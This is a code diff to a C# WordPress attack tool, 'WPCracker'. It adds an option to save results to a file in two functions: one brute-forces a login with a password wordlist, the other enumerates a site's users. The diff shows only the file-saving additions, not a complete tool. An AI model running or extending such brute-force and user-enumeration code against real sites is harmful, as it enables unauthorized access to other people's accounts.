@@ -9,7 +9,7 @@ namespace WPCracker
 {
     class Attacks
     {
-        public static void BruteForceAttack(string uri, string username, string wordlistPath, int maxThreads, int batchCount)
+        public static void BruteForceAttack(string uri, string username, string wordlistPath, int maxThreads, int batchCount, string outFilePath)
         {
             var login = new Login(new Uri(uri));
             using var sr = new StreamReader(wordlistPath);
@@ -55,6 +55,13 @@ namespace WPCracker
                         Console.WriteLine($"Username: {username}\nPassword: {password}");
                         Console.ResetColor();
                         found = true;
+
+                        if (!string.IsNullOrEmpty(outFilePath))
+                        {
+                            var toFile = new SaveResult();
+
+                            toFile.LoginCredentialsToFileAsync(uri, outFilePath, username, password);
+                        }
                     }
                     catch (Exception ex)
                     {
@@ -74,7 +81,7 @@ namespace WPCracker
             Console.WriteLine($"\nPassword for username {username} NOT found!");
         }
 
-        public static async void UserEnum(string uri)
+        public static async void UserEnum(string uri, string outFilePath)
         {
             var client = new HttpClient();
             var response = await client.GetAsync(uri);
@@ -86,7 +93,8 @@ namespace WPCracker
             Console.ForegroundColor = ConsoleColor.Green;
             Console.WriteLine($"Found {list.Count} user(s)\n");
             Console.ForegroundColor = ConsoleColor.Yellow;
-            
+
+            var first = true;
             foreach (var t in list)
             {
                 Console.WriteLine($"ID:.............{t.Id}");
@@ -95,6 +103,14 @@ namespace WPCracker
                 Console.WriteLine($"LINK:...........{t.Link}");
                 Console.WriteLine($"URL:............{t.Url}");
                 Console.WriteLine($"SLUG:...........{t.Slug}\n");
+
+                if (!string.IsNullOrEmpty(outFilePath))
+                {
+                    var toFile = new SaveResult();
+                    toFile.UsersToFileAsync(uri, outFilePath, t, first);
+                }
+                
+                first = false;
             }
             Console.ResetColor();
         }
